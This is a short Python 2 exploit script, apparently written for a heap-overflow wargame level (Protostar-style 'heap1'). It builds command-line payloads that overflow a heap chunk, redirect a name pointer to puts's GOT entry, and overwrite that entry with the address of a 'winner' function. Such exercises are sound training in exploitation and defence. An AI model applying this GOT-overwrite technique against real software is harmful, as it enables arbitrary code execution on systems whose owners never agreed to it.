#!/usr/bin/python2.6

"""
In this exploit, through argv[1], we change the pointer of i2->name to point to the address of puts in .got.plt 
Then,            through argv[2], we write in the above address, effectively replacing the jump address of puts
with the address of the function winner. Genious!

Generally, argv[1] controls the address to which we will write and argv[2] controls the value that we will write.
Thus, another idea would be to overwritte the return address of main.
"""


import struct

class Chunk:
    metadata_sz = 8

    def __init__(self, name, id, data_sz, padding_sz):
        self.name = name
        self.id = id
        self.data_sz = data_sz
        self.padding_sz = padding_sz # padding after the data in order to reach alignment

    def getSize(self):
        return Chunk.metadata_sz + self.data_sz + self.padding_sz

    def getUserSize(self):
        return self.data_sz + self.padding_sz

winner_addr = 0x08048494
puts__got_plt = 0x8049774

struct_internet_sz = 8

i1_chunk = Chunk("i1_chunk", 0, struct_internet_sz, 0)  # chunk 0
i1_name_chunk = Chunk("i1_name_chunk", 1, 8, 0)         # chunk 1

i2_chunk = Chunk("i2_chunk", 2, struct_internet_sz, 0)  # chunk 2
i2_name_chunk = Chunk("i2_name_chunk", 3, 8, 0)         # chunk 3

argv1 = "A"*(
    # chunk1
    i1_name_chunk.getUserSize() +

    # chunk2
    i2_chunk.metadata_sz +
    4 # i2->priority
)
# Still on chunk 2
argv1 = argv1 + struct.pack("P", puts__got_plt) + "\0" # The last NULL byte will be written in chunk3's metadata but who cares

argv2 = struct.pack("P", winner_addr) + "\0"

payload = argv1 + ' ' + argv2
print(payload)
